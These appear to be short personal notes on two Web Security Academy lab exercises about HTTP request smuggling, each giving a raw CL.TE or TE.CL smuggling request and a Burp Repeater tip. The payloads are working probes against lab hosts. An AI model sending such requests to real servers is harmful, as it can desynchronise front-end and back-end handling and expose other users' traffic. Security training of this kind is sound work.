____

# HTTP request smuggling, confirming a CL.TE vulnerability via differential responses


```
POST / HTTP/1.1
Host: 0ad900fc04a5e02480c97b4300e60060.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

![[Pasted image 20240815043936.png]]


# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```